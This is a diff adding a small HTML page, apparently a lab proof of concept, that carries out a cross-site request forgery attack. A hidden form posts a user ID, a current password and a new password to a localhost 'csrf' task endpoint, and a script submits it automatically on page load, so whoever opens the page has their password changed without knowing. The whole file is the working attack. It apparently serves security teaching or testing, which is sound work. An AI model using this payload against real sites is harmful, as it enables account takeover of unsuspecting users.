@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <form action="http://localhost:3050/api/tasks/csrf" method="POST">
+    <!-- Simulated CSRF attack payload -->
+    <input type="hidden" name="userId" value="1">
+    <input type="hidden" name="currentPassword" value="333333">
+    <input type="hidden" name="newPassword" value="111111">
+  </form>
+  <script>
+    // Automatically submit the form to execute the attack
+    document.forms[0].submit();
+  </script>
+</body>
+</html>
